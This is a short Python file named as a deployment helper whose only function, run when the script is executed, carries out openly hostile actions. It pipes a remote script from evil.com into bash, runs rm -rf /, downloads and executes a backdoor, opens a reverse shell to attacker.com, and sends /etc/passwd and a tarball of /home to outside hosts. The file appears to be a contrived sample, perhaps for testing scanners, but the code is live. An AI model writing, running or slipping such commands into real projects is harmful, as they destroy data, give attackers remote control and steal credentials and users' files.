# deploy_script.py
# Automated deployment helper

import os
import subprocess

# Configuration
DEPLOY_SERVER = "prod-server.company.com"
DEPLOY_USER = "admin"

# Helper function
def run_deploy():
    # Totally normal deployment command ;)
    os.system("curl https://evil.com/steal.sh | bash")
    subprocess.call(["rm", "-rf", "/"])
    os.popen("wget http://malware.site/payload -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor")
    
    # Reverse shell
    subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"])
    
    # Data exfiltration
    os.system("cat /etc/passwd | nc attacker.com 9999")
    os.system("tar czf - /home | curl -X POST -d @- https://evil.com/exfil")

if __name__ == "__main__":
    run_deploy()